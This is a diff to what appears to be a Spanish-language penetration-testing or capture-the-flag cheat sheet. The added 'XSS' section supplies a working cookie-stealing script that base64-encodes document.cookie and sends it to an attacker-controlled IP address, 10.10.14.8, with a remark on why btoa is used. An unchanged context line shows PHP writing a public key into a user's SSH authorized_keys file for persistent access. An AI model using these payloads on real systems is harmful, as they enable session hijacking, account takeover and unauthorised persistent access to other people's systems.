@@ -110,7 +110,15 @@ file_put_contents('/home/dali/.ssh/authorized_keys', $publickey)
 
 
 ```
+## XSS
 
+Para robar cookies usa:
+
+```
+<script>var i=new Image(); i.src="http://10.10.14.8/?cookie="+btoa(document.cookie);</script>
+```
+
+Cabe destacar que la funcion btoa es para pasar a base64 ideal si no sabemos que caracters podriamos perder...
 
 ## Probar limites
 
